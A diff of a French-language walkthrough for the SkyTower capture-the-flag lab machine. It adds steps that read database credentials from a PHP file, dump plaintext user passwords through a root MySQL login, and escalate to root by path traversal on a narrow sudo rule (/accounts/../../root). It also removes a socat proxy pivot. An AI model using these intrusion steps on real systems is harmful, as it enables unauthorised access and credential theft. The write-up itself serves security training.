@@ -104,6 +104,8 @@ drwx------ 2 sara    sara    4096 Jun 20  2014 sara
 drwx------ 2 william william 4096 Jun 20  2014 william
 ````
 
+## /var/www/login.php
+
 Recupérer les access bdd dans la page php
 ````
 cat /var/www/log*
@@ -156,44 +158,82 @@ echo "</HTML>"
 ?>
 ````
 
+## MySQL 
+
+Dump la bdd pour trouver les credentials de xx et sara 
+````
+john@SkyTower:~$ mysql -u root --host=127.0.0.1 -proot
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 57
+Server version: 5.5.35-0+wheezy1 (Debian)
+
+Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> SHOW Databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| SkyTech            |
+| mysql              |
+| performance_schema |
++--------------------+
+4 rows in set (0.02 sec)
+
+mysql> USE SkyTech;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> SHOW tables;
++-------------------+
+| Tables_in_SkyTech |
++-------------------+
+| login             |
++-------------------+
+1 row in set (0.00 sec)
+
+mysql> select * from login;
++----+---------------------+--------------+
+| id | email               | password     |
++----+---------------------+--------------+
+|  1 | john@skytech.com    | hereisjohn   |
+|  2 | sara@skytech.com    | ihatethisjob |
+|  3 | william@skytech.com | senseable    |
++----+---------------------+--------------+
+3 rows in set (0.00 sec)
+````
 
 
+## Ssh Sara
 
+Sara est déconnectée tout comme john.
+````
+john@SkyTower:~$ su -c 'mv /home/sara/.bashrc /tmp/bashrc.old' sara
+Password: 
+````
 
-socat TCP-LISTEN:9999,reuseaddr,fork PROXY:192.168.1.84:127.0.0.1:22,proxyport=3128
-ssh john@locahost -p 9999
-exit en fin de .bashrc 
-
-ssh john@127.0.0.1 -p 9999 /bin/bash
-
-
-
-dump la bdd pour trouver les pswd de xx et sara 
-
-
-
-sara même blague du exit ds .bashrc 
-
-
-
-
-
+## sudo
+````
 $ sudo -l
 Matching Defaults entries for sara on this host:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 User sara may run the following commands on this host:
     (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
-sara@SkyTower:~$ 
-sara@SkyTower:~$ 
-sara@SkyTower:~$ 
-sara@SkyTower:~$ 
-sara@SkyTower:~$ 
+
 sara@SkyTower:~$ sudo /bin/ls /accounts/../../root
 flag.txt
 sara@SkyTower:~$ sudo /bin/cat /accounts/../../root/flag.txt
 Congratz, have a cold one to celebrate!
-root password is theskytower
+root password is xxxxx
+````
 
 
 
